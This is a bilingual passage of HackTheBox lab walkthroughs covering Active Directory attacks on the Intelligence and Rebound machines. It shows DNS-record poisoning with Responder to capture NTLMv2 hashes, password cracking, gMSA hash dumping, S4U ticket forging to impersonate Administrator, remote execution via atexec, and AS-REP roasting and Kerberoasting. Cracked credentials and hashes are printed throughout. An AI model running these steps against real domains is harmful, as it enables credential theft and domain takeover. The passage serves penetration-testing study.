	fr--r--r--                1 Sun Dec 31 23:58:45 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-a50-0
	IT                                                	READ ONLY	
	.\IT\*
	dr--r--r--                0 Mon Apr 19 01:50:58 2021	.
	dr--r--r--                0 Mon Apr 19 01:50:58 2021	..
	fr--r--r--             1046 Mon Apr 19 01:50:58 2021	downdetector.ps1
	NETLOGON                                          	READ ONLY	Logon server share 
	.\NETLOGON\*
	dr--r--r--                0 Mon Apr 19 01:42:14 2021	.
	dr--r--r--                0 Mon Apr 19 01:42:14 2021	..
	SYSVOL                                            	READ ONLY	Logon server share 
	.\SYSVOL\*
	dr--r--r--                0 Mon Apr 19 01:42:14 2021	.
	dr--r--r--                0 Mon Apr 19 01:42:14 2021	..
	dr--r--r--                0 Mon Apr 19 01:42:14 2021	intelligence.htb
	Users                                             	READ ONLY	
	.\Users\*
	dw--w--w--                0 Mon Apr 19 02:20:26 2021	.
	dw--w--w--                0 Mon Apr 19 02:20:26 2021	..
	dr--r--r--                0 Mon Apr 19 01:18:39 2021	Administrator
	dr--r--r--                0 Mon Apr 19 04:16:30 2021	All Users
	dw--w--w--                0 Mon Apr 19 03:17:40 2021	Default
	dr--r--r--                0 Mon Apr 19 04:16:30 2021	Default User
	fr--r--r--              174 Mon Apr 19 04:15:17 2021	desktop.ini
	dw--w--w--                0 Mon Apr 19 01:18:39 2021	Public
	dr--r--r--                0 Mon Apr 19 02:20:26 2021	Ted.Graves
	dr--r--r--                0 Mon Apr 19 01:51:46 2021	Tiffany.Molina
```

We have access to few of the shares so let's try and access those.

#### User.txt

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# smbclient //intelligence.htb/Users -U 'Tiffany.Molina'
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> cd Tiffany.Molina\Desktop\
smb: \Tiffany.Molina\Desktop\> get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\> quit
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# cat user.txt 
6fd023d238f2d2a63ecb521504fc1dd3
```
Now you have user.txt

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2013.jpg)

#### PrivESC
#### Enumeration

The share that looked intresting to me was IT, so let's look into that.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# smbclient //intelligence.htb/IT -U 'Tiffany.Molina'
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

                3770367 blocks of size 4096. 1463495 blocks available
smb: \> get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
```

Looks like we have a powershell script let's explore it.

``` powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

Looks like we have the cronjob kind of thing running every five minutes we can see that it makes a request to webserver if we can bypass the check for validation which will be pretty easy as it uses web* as validation so not much problem there.

Now so I think that if we can add a dns in the record we can get the Ted.Graves hash using responder.

Basically the login behind this is simple we add the dns record and then the Ted will see if that record responds back or not and as soon as Ted checks that record we will get his hash in responder.

``` bash
kali@kali:~/HackTheBox/Intelligence$ sudo python /usr/share/responder/Responder.py -I tun0 -A                                                                         
                                         __                                                                                                                           
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                              
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                              
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                                
                   |__|                                                                                                                                               
 
           NBT-NS, LLMNR & MDNS Responder 3.0.2.0                 
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C 
/!\ Warning: files/AccessDenied.html: file not found
/!\ Warning: files/BindShell.exe: file not found                                                                                                                      
 
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
	
[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
	POP3 server                [ON] 
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [ON]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.14]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP']



[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.14.14) is not on the same subnet than the DNS server (<--SNIP--->).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.14.14) is not on the same subnet than the DNS server (<---SNIP---->).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[+] Listening for events..
```

Now let's try and use dnstool to deal with DNS records.
you can find the dnstool over here.

 - [krbrelayx](https://github.com/dirkjanm/krbrelayx.git)

You can install it like below.

``` bash
kali@kali:~/HackTheBox/Intelligence$ git clone https://github.com/dirkjanm/krbrelayx.git
Cloning into 'krbrelayx'...
remote: Enumerating objects: 98, done.
remote: Total 98 (delta 0), reused 0 (delta 0), pack-reused 98
Unpacking objects: 100% (98/98), 65.74 KiB | 474.00 KiB/s, done.
kali@kali:~/HackTheBox/Intelligence$ cd krbrelayx/
kali@kali:~/HackTheBox/Intelligence/krbrelayx$ ls
addspn.py  dnstool.py  krbrelayx.py  lib  LICENSE  printerbug.py  README.md
┌──(root💀kali)-[~/krbrelayx]
└─# python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'weboops.intelligence.htb' -d 10.10.14.6 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/root/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
```

Now we our record in DNS so let's wait for hash in responder.
Note this may take up to 5 mins so be patient.

``` bash
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:37c9f1a5fd8546ff:1E0D7AFAA686BD619EA26FDB77D8DCD8:010100000000000063FBFF768775D7010792963655F4E95300000000020008004200310054004B0001001E00570049004E002D00320034004800500058004900390058004C0036004B00040014004200310054004B002E004C004F00430041004C0003003400570049004E002D00320034004800500058004900390058004C0036004B002E004200310054004B002E004C004F00430041004C00050014004200310054004B002E004C004F00430041004C0008003000300000000000000000000000002000009B97627A224CC43FDB02F82503B8A278F65DE3C1A1FAE4A1DC244143C2FF45020A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Now we have the hash for Ted.Graves let's try and crack it.
Over here I have used john you can also use hashcat for the same and there are also online cracker if you prefer that.

``` bash
kali@kali:~/HackTheBox/Intelligence/krbrelayx$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)
1g 0:00:00:23 DONE (2021-07-04 18:17) 0.04170g/s 450978p/s 450978c/s 450978C/s Mrz.deltasigma..Mr BOB
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Now we have the password for Ted.Graves
So let's enumerate the ldap as we already know we don't have much on share.
I got this tool from the link

 - [gMSADumper](https://github.com/micahvandeusen/gMSADumper)

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence/gMSADumper-main]
└─# python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb                                                           
svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
```

we have a hash but unfortunately it's not in rockyou.txt

``` bash
kali@kali:~/HackTheBox/Intelligence/gMSADumper$ sudo john new --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:04 DONE (2021-07-04 18:30) 0g/s 3431Kp/s 3431Kc/s 3431KC/s      markinho..*7¡Vamos!
Session completed
```

So now the other option is to get the kerberos ticket using that hash.
Famously or INFamously known as silver ticket attack on AD.
So you can search Silver Ticket attack on Active Directory to learn more.
Let's try that.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence/gMSADumper-main]
└─# python3 getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

It gives me error for the clock skew which is normal if you are familiar with Active Directory you just have to sync time between the server and machine.
So let's use ntpdate to do that.
if you don't have ntpdate you can install it using

``` bash
sudo apt-get install ntpdate
```

then run the command

``` bash
sudo ntpdate 10.10.10.248
```

Now the clock skew has been fixed let's try silver ticket attack again.
If the time doesn't change try the following

``` bash
sudo apt-get install chrony
sudo timedatectl set-ntp true
sudo ntpdate 10.10.10.248
```

And now run the command

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence/gMSADumper-main]
└─# python3 getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Now let's use that ticket to authenticate.

``` bash
kali@kali:~/HackTheBox/Intelligence$ smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
IT
NETLOGON
SYSVOL
Users
# use Users
# ls
drw-rw-rw-          0  Mon Apr 19 02:20:26 2021 .
drw-rw-rw-          0  Mon Apr 19 02:20:26 2021 ..
drw-rw-rw-          0  Mon Apr 19 01:18:39 2021 Administrator
drw-rw-rw-          0  Mon Apr 19 04:16:30 2021 All Users
drw-rw-rw-          0  Mon Apr 19 03:17:40 2021 Default
drw-rw-rw-          0  Mon Apr 19 04:16:30 2021 Default User
-rw-rw-rw-        174  Mon Apr 19 04:15:17 2021 desktop.ini
drw-rw-rw-          0  Mon Apr 19 01:18:39 2021 Public
drw-rw-rw-          0  Mon Apr 19 02:20:26 2021 Ted.Graves
drw-rw-rw-          0  Mon Apr 19 01:51:46 2021 Tiffany.Molina
# cd Administrator
# cd Desktop
# get root.txt
```

So now we root so let's get all the flags.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# cat root.txt                                                                                                                  
5a582f5f16388c9959ef6d4b3dcbe914
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2014.jpg)

or you can use:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# python3 atexec.py -k -no-pass dc.intelligence.htb 'whoami'
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[!] This will work ONLY on Windows >= Vista
[*] Creating task \krUvePvx
[*] Running task \krUvePvx
[*] Deleting task \krUvePvx
[*] Attempting to read ADMIN$\Temp\krUvePvx.tmp
nt authority\system
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# python3 atexec.py -k -no-pass dc.intelligence.htb 'type C:\Users\Administrator\Desktop\root.txt'
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[!] This will work ONLY on Windows >= Vista
[*] Creating task \ocxiGfwW
[*] Running task \ocxiGfwW
[*] Deleting task \ocxiGfwW
[*] Attempting to read ADMIN$\Temp\ocxiGfwW.tmp
5a582f5f16388c9959ef6d4b3dcbe914
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2015.jpg)

#### Summary of knowledge

 - SMB enumeration
 - LDAP enumeration
 - write python script to batch download and extract data
 - brute Kerberos by using kerbrute and crackmapexec
 - add dns record by using krbrelayx's dnstool then use responder get NTLMv2 Hash
 - crack NTLMv2 hash with john
 - use gMSADumper get svc_int's hash
 - sync time between the server and machine by using ntpdate and chrony
 - use getST.py to get Administrator.ccache to perform a Silver Ticket attack
 - use smbclient.py or atexec.py and Silver Ticket to get user and root flag

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end intelligence -->

</details>

<a id="case-rebound"></a>

## 对象继承、跨会话 Relay 与 RBCD

原文连贯记录 RID、AS-REP、ACL、Shadow Credentials、跨会话 Relay 和 gMSA。KCD 与 RBCD 的票据处理、channel binding 错误和失败分支均可回查。

<p class="kb-provenance">来源 rebound · 原记录 2024-04-01 · 35 个代码块 · 14 处图片引用</p>

<details class="kb-evidence" id="record-rebound">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start rebound -->

#### 简述

本文是Insane难度的HTB Rebound机器的域渗透部分，其中RID cycling + AS-REP-Roasting with Kerberoasting + Weak ACLs + ShadowCredentials attack + cross-session relay + Runascs and KrbRelay read gMSA password + Resource-Based Constrained Delegation (RBCD) + S4U2Self & S4U2Proxy等域渗透提权细节是此box的特色，主要参考[0xdf's blog rebound walkthrough](https://0xdf.gitlab.io/2024/03/30/htb-rebound.html)和[HTB的rebound官方writeup paper](https://app.hackthebox.com/machines/Rebound/writeups)记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound0.png)



#### 信息收集

``` bash
nmap -p- --min-rate 10000 10.10.11.231

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49681/tcp open  unknown
49688/tcp open  unknown
49724/tcp open  unknown
55738/tcp open  unknown

nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.231

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-17 23:09:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2024-03-17T23:11:51+00:00; -1s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2024-03-17T23:11:50+00:00; -2s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2024-03-17T23:11:51+00:00; -1s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2024-03-17T23:11:50+00:00; -2s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/17%Time=65F77824%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

开放389，636 ldap端口，很明显是一个windows域控

#### RID cycling

首先尝试smb列出共享

``` bash
┌─[root@kali] - [~/hackthebox/machine/rebound] - [2540]
└─[$] smbclient -L \\\\10.10.11.231\\                                                                                                                [20:23:17]
Password for [WORKGROUP\root]: anonymous

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shared          Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.231 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

只有Shared共享可用——尽管它是空的。考虑到可以匿名登录，尝试通过Impacket的lookupsid.py枚举用户，它使用暴力查找现有用户的[安全标识符(SID)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers)。它通过循环遍历相对标识符(rid)来实现这一点，rid与域的SID连接以形成整个SID。根据参考文档:

***对于域帐户，通过将域的SID与帐户的相对标识符(RID)连接来创建安全主体的SID。***

运行impacket-lookupsid，在目标IP地址前加上任意的用户名:

``` bash
┌─[root@kali] - [~/hackthebox/machine/rebound] - [2541]
└─[$] impacket-lookupsid nan@10.10.11.231 -no-pass                                                                                                   [20:24:28]
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

[*] Brute forcing SIDs at 10.10.11.231
[*] StringBinding ncacn_np:10.10.11.231[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: rebound\Administrator (SidTypeUser)
501: rebound\Guest (SidTypeUser)
502: rebound\krbtgt (SidTypeUser)
512: rebound\Domain Admins (SidTypeGroup)
513: rebound\Domain Users (SidTypeGroup)
514: rebound\Domain Guests (SidTypeGroup)
515: rebound\Domain Computers (SidTypeGroup)
516: rebound\Domain Controllers (SidTypeGroup)
517: rebound\Cert Publishers (SidTypeAlias)
518: rebound\Schema Admins (SidTypeGroup)
519: rebound\Enterprise Admins (SidTypeGroup)
520: rebound\Group Policy Creator Owners (SidTypeGroup)
521: rebound\Read-only Domain Controllers (SidTypeGroup)
522: rebound\Cloneable Domain Controllers (SidTypeGroup)
525: rebound\Protected Users (SidTypeGroup)
526: rebound\Key Admins (SidTypeGroup)
527: rebound\Enterprise Key Admins (SidTypeGroup)
553: rebound\RAS and IAS Servers (SidTypeAlias)
571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
1000: rebound\DC01$ (SidTypeUser)
1101: rebound\DnsAdmins (SidTypeAlias)
1102: rebound\DnsUpdateProxy (SidTypeGroup)
1951: rebound\ppaul (SidTypeUser)
2952: rebound\llune (SidTypeUser)
3382: rebound\fflock (SidTypeUser)
```

返回少量用户，因为在默认情况下，impacket-lookupsid将RID的最大值设置为4000。将这个限制增加到10000，并再次运行这个工具:

现在看到rid最多为7687的用户，这提供了大量的用户名样本。将所有的SidTypeUser条目保存到一个文件中，以供以后使用。

``` bash
impacket-lookupsid nan@10.10.11.231 10000 -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > usernames.txt

┌─[root@kali] - [~/hackthebox/machine/rebound] - [2542]
└─[$] cat usernames.txt                                                                                                                              [20:32:18]
Administrator
Guest
krbtgt
DC01$
ppaul
llune
fflock
jjones
mmalone
nnoon
ldap_monitor
oorend
winrm_svc
batch_runner
tbrady
delegator$
```

#### AS-REP-Roasting with Kerberoasting

现在尝试识别易受AS-REP-roasting攻击的用户。在配置帐户时不要求Kerberos预身份验证，从而允许攻击者为这些用户请求加密的票据授予票据(tgt)，而不需要用户的密码，就会出现此漏洞。

[Impacket](https://github.com/fortra/impacket)的GetNPUsers.py工具可以为具有UF_DONT_REQUIRE_PREAUTH属性的用户检索票授予票(tgt)

``` bash
┌─[root@kali] - [~/hackthebox/machine/rebound] - [2543]
└─[$] impacket-GetNPUsers -usersfile usernames.txt rebound.htb/ -dc-ip 10.10.11.231                                                                  [20:34:38]
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:95d51957aa3771dacc1664c6236c4055$d434f84d1d47433e95073960ed2980c385ae8f830686ef69bc2c0d9b23e197a2901986f89105ff750b722e9cb7086ad9d13c924e41e182cc4e8e0e646838397aa50e33c6356b24f860b4791cdaec04d57bc3f2734ab7749e42073aadfb097ea24a55dd4ae56f68d7f8cba78d1cdb8dcbeedb63f6c11dd6a813d6729a8c76666d9ff687a06b84fb1e6abdb4b92c9b372f44f0c8682f3f36dec2118efa0b81952041c2d180a8ebe0c77d47ea5da4344d1897d1f5b3b92e1618a39ebb94c0e55c457f84d5952f226890e2b1091dc656eb1e1ff16cbf4bb5a288683ea55e64c9491212260953e3574dfd0b9b
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

jjones返回一个加密的TGT。不幸的是，它似乎无法破解

最近的[New Attack Paths? AS Requested Service Tickets](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)表明，可以利用AS-REP-roastable用户来执行Kerberoasting，而无需预身份验证:

***但是，对于Kerberoasting，不需要访问会话密钥。只需要生成的ST，或者更准确地说，不使用请求帐户密钥保护的ST的加密部分。因此，如果将任何帐户配置为不需要预身份验证，则可以在没有任何凭据的情况下进行Kerberoast。***

对这种攻击的支持是在[Support for Kerberoasting without pre-authentication and ST request through AS-REQ #1413](https://github.com/fortra/impacket/pull/1413)中提交的，并且已经合并到当前的Impacket主分支中，但在本文时还没有作为正式版本推出。因此，将使用一个支持这种攻击的[impacket github分支](https://github.com/ThePorgs/impacket)，以及本文后面需要的其他一些攻击操作。所有与impack相关的命令都将使用此版本的工具执行。

``` bash
python3 -m venv impacket-fork
source ./impacket-fork/bin/activate
git clone https://github.com/ThePorgs/impacket.git
cd impacket
python3 setup.py install
```

现在，可以使用GetUserSPNs.py的-no-preauth选项来请求票据授予服务(Ticket Granting Service, TGS)票据，使用jjones的加密TGT

``` bash
(impacket-fork) [root@kali ~ ]$ GetUserSPNs.py -no-preauth jjones -request -usersfile /root/hackthebox/machine/rebound/usernames.txt rebound.htb/ -dc-ip 10.10.11.231
/root/impacket-fork/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.10.1.dev1+20231106.134307.9aa93730', 'GetUserSPNs.py')
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs

[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$b7f4495dad8442753f659146$228b6f2a0f7a0b5319fe1c223e915352d84fa0fd83915cfe9d57a41915382f4413af126465af63450eff3f05284915e8dcbf94af88b3888cacdcac941de7981f3aa5246439f4186434e91be539bbefc017b1a6a13b07f996ae068586469ba1b8cfffb1091eeb7ed5480623478bd25e66c26d8893a1eff939d7f475549866856701801e2bdde297cf4030a0131532261136f738dff5d0e77fae4da3c64c9e5589a1a4349b88c7b97b75621350a0e6fe2d191c7b7a52dbc478e9442da0e4008007838cb14695bcc7a98bdb7c68a70fce74d5748fd13d017235cb451326443f100642e6c09570df22795bca436d292b3014e8d10a0c3fbb50911e6b88bb66b2232420d0eaace34f6aaf9847f5e684380de41ae1b70f4a975fa0acf8b2b5dbebff865232a3aba195f72dac905dba0ea55182f10cd6ccda43978273a4fae20b424c4414a2cd6b1e385637759db2a8e832e1d0e4c44207d97c16acad3e20e32b6b46d256023d8641207a419ca9fb23fcb995adfda0394405bb77a8d4d3d8a4ba22ae2370f7fa93b84827e4496537b22170d9f8af84b3c591a1759873114b6d4de1f984e25a2cd70e34a4bc33b956c74185aab15d844dda9f9b391bd0a017d3c836df34b7c9312a943e91dc956d20661fe752b4763dc2ed6a3e5bfb7d09f1546fd04b6d8577bce8781904491428db21c4e7acf83a359187f44b3bccca0e8c40dcef5541f1ffc767156411d96f6cf1746783b893605779d888b5ee1965a16d6304bac92942a95c66823af762bb8572ccb2ac1382f9002f3eb73ba82cafa13a5ee71fbd720ed8f966a03f5bc67201115a3a1c48db47177a9f4b95937191c42d33b14663e4d4c5d5093b523f92bd82d4087805e0c4c40cef24e63a3219d9a220a74dbb127bd29548a3d7c7c51475dd01feda149b79a1c2f0fdd4dfa40f24db7384bca5057dbf75b552b80551fddf73af319ee5afa5f88420e93e8e04247d3829105d00486424971b0b323da8cdbfc0d110ce1773346bfe2a0cd8b045b978848a48ae3b5d448f3baa4efbef9dcf337238211891e148a7f4d329f98f80039a926a25104e0211bfae00a1ba047897d9ad6149ae47031884879271cae4ee75b59fad20a90313ebc3bcf52002a8cca08a33282d809d5b52a5a5a49c7177161b760f3ed0b6178efbea5bd913efd2a941cba7a9458ab179f875a33447693664ce1ee28baa1cd5ea0fe48cb7b13411a953c5f78a9cce432028a67752a4734527898d74db5416390011305a2907fd2e8f5b38b4b647e32280ad835ad19bc5c1dc86f2f39e28ce305839365bc13e02b0b91ce0de3434f17056a3f68d2ebd62ca9bd3ab1a88f49769e75ae1c